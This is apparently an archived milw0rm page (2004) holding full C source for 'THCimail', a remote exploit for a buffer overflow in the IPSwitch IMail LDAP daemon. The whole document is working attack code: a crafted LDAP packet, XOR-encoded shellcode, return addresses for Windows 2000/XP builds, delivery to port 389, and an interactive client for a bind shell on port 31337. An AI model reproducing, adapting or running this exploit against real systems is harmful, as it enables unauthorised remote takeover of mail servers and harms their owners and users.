<html><head><title>IPSwitch IMail LDAP Daemon Remote Buffer Overflow Exploit
</title></head><pre>/********************************************************/
/* THCimail 0.1 - Wind0wZ remote root exploit                                */
/* Exploit by: Johnny Cyberpunk (jcyberpunk@thc.org)                     */
/* THC PUBLIC SOURCE MATERIALS                                               */
/*                                                                                              */
/* Bug was found by idefense or some idefense slaves ;)                 */
/* http://www.idefense.com/application/poi/display?id=74&amp;type=vuln */
/*                                                                                              */
/* compile with MS Visual C++ : cl THCimail.c                                  */
/*                                                                                              */
/* At least some greetz fly to : THC, Halvar Flake, FX, gera, MaXX,    */
/* dvorak, scut, stealth, FtR and Random                                       */
/********************************************************/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;winsock2.h&gt;

#pragma comment(lib, &quot;ws2_32.lib&quot;)

char *WIN2KEN = &quot;\xc4\x2a\x02\x75&quot;;
char *WIN2KPG = &quot;\xc4\x2a\xf9\x74&quot;;
char *WINXPSP1G = &quot;\xfe\x63\xa1\x71&quot;;

#define jumper &quot;\xeb\x06\x4a\x43&quot;

char ldapshit[] = &quot;\x30\x82\x0a\x3d\x02\x01\x01\x60\x82\x01\x36\x02\xff\xff\xff\xff\x20&quot;;

char shellcode[] =
&quot;\x8b\x7c\x24\xfc\x83\xc7\x21\x33\xc9\xb2\x8f\x66\x81\xc1\x02&quot;
&quot;\x02\x8a\x1f\x32\xda\x88\x1f\x47\xe2\xf7\x64\xac\xf5\xe6\x8d&quot;
&quot;\x8a\xe3\xd6\x77\x92\x13\x51\x03\x5e\xc3\xff\x5b\x8c\x7f\xa8&quot;
&quot;\xaf\xaf\xbf\x87\xd8\xdc\xbd\xd0\xbc\xbd\xa1\xcb\xc3\xc3\x8e&quot;
&quot;\x64\x8a\x67\x76\x70\x70\x70\xd2\x0c\x62\xa5\xe5\xbf\xd6\xeb&quot;
&quot;\x04\x8e\x04\xcf\x83\x04\xff\x93\x22\x04\xf7\x87\x02\xd0\xb3&quot;
&quot;\x04\x94\x8e\x74\x04\xd4\xf7\x8e\x74\x04\xc4\x93\x8e\x76\x04&quot;
&quot;\xdc\xab\x8e\x75\xdc\xde\xdd\x04\xd4\xaf\x8e\x74\xbe\x46\xce&quot;
&quot;\xbe\x4f\x16\x04\xbb\x04\x8e\x71\x23\xbe\x4d\x5e\x6d\x0b\x4f&quot;
&quot;\xfa\x78\x80\x39\xca\x8a\x02\xcb\xca\x8b\xe9\xb6\x9f\xfa\x6e&quot;
&quot;\xe9\xbe\x9f\xd5\xd7\xd1\xd9\xdf\xdd\xa4\xc1\x9f\xce\x80\x38&quot;
&quot;\x83\xc5\x04\x8b\x07\x8e\x77\x80\x39\xc2\x8a\x06\xcb\x02\x57&quot;
&quot;\x71\xc2\x8a\xfa\x31\x71\xc2\x8b\xfb\xae\x71\xc2\xad\x02\xd2&quot;
&quot;\x97\xdc\x70\x5f\x06\x48\xe5\x8b\xd7\x07\xca\x8a\x0f\xca\xf8&quot;
&quot;\x85\x02\xd2\xfb\x0f\xe4\xa9\x9b\x66\xf7\x70\x70\x70\x06\x41&quot;
&quot;\xbe\x54\xdc\xdc\xdc\xdc\xd9\xc9\xd9\x70\x5f\x18\xda\xd7\xe9&quot;
&quot;\x06\xbf\xe5\x9f\xda\xd8\x70\xda\x5b\xc1\xd9\xd8\x70\xda\x43&quot;
&quot;\xdc\xda\xd8\x70\xda\x5f\x18\x02\xca\x07\xdf\x70\xda\x6b\xda&quot;
&quot;\xda\x70\xda\x67\x02\xcb\x8a\x83\x1b\xdc\xe7\xa1\xea\xf7\xea&quot;
&quot;\xe7\xd3\xec\xe2\xeb\x1b\xbe\x5d\x02\xca\x43\x1b\xd8\xd8\xd8&quot;
&quot;\xdc\xdc\x71\x49\x8e\x7d\xdd\x1b\x02\xca\xf7\xdf\x02\xca\x07&quot;
&quot;\xdf\x3e\x87\xdc\xdc\xe5\x9f\x71\x41\xdd\xdc\xdc\xdc\xda\x70&quot;
&quot;\xda\x63\xe5\x70\x70\xda\x6f&quot;;


void usage();
void shell(int sock);

int main(int argc, char *argv[])
{ 
unsigned int i,sock,sock2,addr,os,ver,rc,IMAILVER;
unsigned char *finalbuffer,*crapbuf1,*crapbuf2;
unsigned int IMAIL6_7=60;
unsigned int IMAIL_8=68;

struct sockaddr_in mytcp;
struct hostent * hp;
WSADATA wsaData;

printf(&quot;\nTHCimail v0.1 - Imail LDAP exploit\n&quot;);
printf(&quot;tested on Imail 6-8\n&quot;);
printf(&quot;by Johnny Cyberpunk (jcyberpunk@thc.org)\n&quot;);

if(argc&lt;4 || argc&gt;4)
usage();

ver = (unsigned short)atoi(argv[3]); 
switch(ver)
{
case 0:
IMAILVER = IMAIL6_7;
break;
case 1:
IMAILVER = IMAIL_8;
break;
default:
printf(&quot;\nYou entered an illegal version !\n\n&quot;);
usage();
exit(-1);
}

crapbuf1 = malloc(IMAILVER);
memset(crapbuf1,'X',IMAILVER);

printf(&quot;imailver = %d\n&quot;,IMAILVER);

crapbuf2 = malloc(2220);
memset(crapbuf2,'X',2220);

finalbuffer = malloc(2650);
memset(finalbuffer,0,2650);

printf(&quot;\n[*] building buffer\n&quot;);

strcat(finalbuffer,ldapshit);

strcat(finalbuffer,crapbuf1);

strcat(finalbuffer,jumper);

os = (unsigned short)atoi(argv[2]); 
switch(os)
{
case 0:
strcat(finalbuffer,WIN2KPG);
break;
case 1:
strcat(finalbuffer,WIN2KPG);
break;
case 2:
strcat(finalbuffer,WINXPSP1G);
break;
default:
printf(&quot;\nYou entered an illegal OS !\n\n&quot;);
usage();
exit(-1);
}

strcat(finalbuffer,shellcode);
strcat(finalbuffer,crapbuf2);

if (WSAStartup(MAKEWORD(2,1),&amp;wsaData) != 0)
{
printf(&quot;WSAStartup failed !\n&quot;);
exit(-1);
}

hp = gethostbyname(argv[1]);

if (!hp){
addr = inet_addr(argv[1]);
}
if ((!hp) &amp;&amp; (addr == INADDR_NONE) )
{
printf(&quot;Unable to resolve %s\n&quot;,argv[1]);
exit(-1);
}

sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
if (!sock)
{ 
printf(&quot;socket() error...\n&quot;);
exit(-1);
}

if (hp != NULL)
memcpy(&amp;(mytcp.sin_addr),hp-&gt;h_addr,hp-&gt;h_length);
else
mytcp.sin_addr.s_addr = addr;

if (hp)
mytcp.sin_family = hp-&gt;h_addrtype;
else
mytcp.sin_family = AF_INET;

mytcp.sin_port=htons(389);

printf(&quot;[*] connecting the target\n&quot;);

rc=connect(sock, (struct sockaddr *) &amp;mytcp, sizeof (struct sockaddr_in));
if(rc==0)
{
send(sock,finalbuffer,2650,0);
printf(&quot;[*] Exploit send successfully ! Sleeping a while ....\n&quot;);
Sleep(1000);
}
else
printf(&quot;\nCan't connect to ldap port!\n&quot;);

if(rc==0)
{
printf(&quot;[*] Trying to get a shell\n\n&quot;);
sock2 = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
mytcp.sin_port = htons(31337);
rc = connect(sock2, (struct sockaddr *)&amp;mytcp, sizeof(mytcp));
if(rc!=0)
{
printf(&quot;can't connect to port 31337 ;( maybe firewalled ...\n&quot;);
exit(-1);
}
shell(sock2);
}

shutdown(sock,1);
closesocket(sock);

free(crapbuf1);
free(crapbuf2);
free(finalbuffer); 

exit(0);
}

void usage()
{
unsigned int a;
printf(&quot;\nUsage: &lt;Host&gt; &lt;OS&gt; &lt;Imail Version&gt;\n&quot;);
printf(&quot;Sample: THCimail 194.44.55.56 0 1\n\n&quot;);
printf(&quot;OS:\n&quot;);
printf(&quot;0 - Windows 2000 Server english all service packs\n&quot;);
printf(&quot;1 - Windows 2000 Professional german\n&quot;);
printf(&quot;2 - Windows XP SP1 german\n\n&quot;);
printf(&quot;Imail Version:\n&quot;);
printf(&quot;0 - Imail 6+7\n&quot;);
printf(&quot;1 - Imail 8\n&quot;);
exit(0);
}

void shell(int sock)
{
int l;
char buf[1024];
struct timeval time;
unsigned long ul[2];

time.tv_sec = 1;
time.tv_usec = 0;

while (1)
{
ul[0] = 1;
ul[1] = sock;

l = select (0, (fd_set *)&amp;ul, NULL, NULL, &amp;time);
if(l == 1)
{ 
l = recv (sock, buf, sizeof (buf), 0);
if (l &lt;= 0)
{
printf (&quot;bye bye...\n&quot;);
return;
}
l = write (1, buf, l);
if (l &lt;= 0)
{
printf (&quot;bye bye...\n&quot;);
return;
}
}
else
{
l = read (0, buf, sizeof (buf));
if (l &lt;= 0)
{
printf(&quot;bye bye...\n&quot;);
return;
}
l = send(sock, buf, l, 0);
if (l &lt;= 0)
{
printf(&quot;bye bye...\n&quot;);
return;
}
}
}
}



// milw0rm.com [2004-02-27]</pre></html>